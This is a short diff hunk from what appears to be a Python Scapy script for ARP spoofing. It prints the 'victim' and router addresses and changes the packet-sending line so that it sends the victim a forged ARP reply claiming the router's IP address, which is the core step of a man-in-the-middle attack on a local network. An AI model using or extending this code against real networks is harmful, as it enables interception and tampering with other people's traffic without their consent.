@@ -22,7 +22,7 @@ print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])
 
 print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
 
-arply = srp((Ether(dst=(mac[victim-1]))/ARP(op = 2,pdst=(ip[victim-1]))), timeout=3, verbose=0)
+arply = srp(ARP(hwdst =(mac[victim-1]),op = 2,pdst=(ip[victim-1]), psrc=(ip[router-1])), timeout=3, verbose=0)
 
     
     
